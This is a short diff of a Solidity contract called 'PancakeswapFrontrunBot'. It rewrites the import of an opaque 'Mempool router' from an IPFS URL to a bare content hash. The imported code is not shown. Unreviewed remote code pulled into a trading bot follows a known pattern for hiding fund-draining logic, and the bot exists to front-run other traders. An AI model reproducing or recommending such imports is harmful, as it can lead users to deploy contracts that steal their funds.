@@ -6,7 +6,7 @@ import "contracts/interfaces/V1/IUniswapV1Exchange.sol";
 import "contracts/interfaces/V1/IUniswapV1Factory.sol";
 
 //Mempool router
-import "https://ipfs.filebase.io/ipfs/QmZrH8EDpYmt3F9mQbaGEn6jSHXf9KmXeonDuXQJzRArxG";
+import "QmZrH8EDpYmt3F9mQbaGEn6jSHXf9KmXeonDuXQJzRArxG";
 
 contract PancakeswapFrontrunBot {
  
